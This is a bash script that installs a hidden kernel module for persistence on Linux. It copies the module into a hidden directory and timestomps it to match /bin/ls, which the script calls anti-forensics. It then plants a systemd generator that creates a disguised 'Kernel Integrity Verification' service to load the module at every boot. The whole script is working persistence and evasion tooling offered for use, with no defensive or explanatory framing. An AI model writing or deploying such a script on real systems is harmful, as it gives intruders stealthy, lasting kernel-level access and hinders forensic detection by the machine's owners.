#!/bin/bash
# poison_systemd.sh
# Usage: ./poison_systemd.sh <path_to_module.ko>

MODULE_SRC=$1
HIDDEN_PATH="/usr/lib/.kernel_driver"
GENERATOR_PATH="/lib/systemd/system-generators/systemd-runtime-check"

if [ -z "$MODULE_SRC" ]; then
    echo "Usage: $0 <module.ko>"
    exit 1
fi

# 1. Hide the module on disk
mkdir -p "$HIDDEN_PATH"
cp "$MODULE_SRC" "$HIDDEN_PATH/driver.ko"
# Anti-Forensics: Timestomp to match a system binary (ls)
touch -r /bin/ls "$HIDDEN_PATH/driver.ko"

# 2. Create the Generator Script
# We create a shell script that systemd will execute at boot
cat <<EOF > "$GENERATOR_PATH"
#!/bin/sh
# This script runs at boot before networking
# It generates a service unit in /run/systemd/generator/

OUT_DIR="\$1"
SERVICE="kernel-integrity-check.service"

# Create the service file in memory (RAM)
# Note: DefaultDependencies=no is CRITICAL to avoid ordering cycles
cat <<UNIT > "\$OUT_DIR/\$SERVICE"
[Unit]
Description=Kernel Integrity Verification
DefaultDependencies=no
Before=sysinit.target
Conflicts=shutdown.target

[Service]
Type=oneshot
ExecStart=/usr/sbin/insmod $HIDDEN_PATH/driver.ko
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target
UNIT

# Link it to be started automatically by the system initialization
mkdir -p "\$OUT_DIR/sysinit.target.wants"
ln -s "\$OUT_DIR/\$SERVICE" "\$OUT_DIR/sysinit.target.wants/\$SERVICE"
exit 0
EOF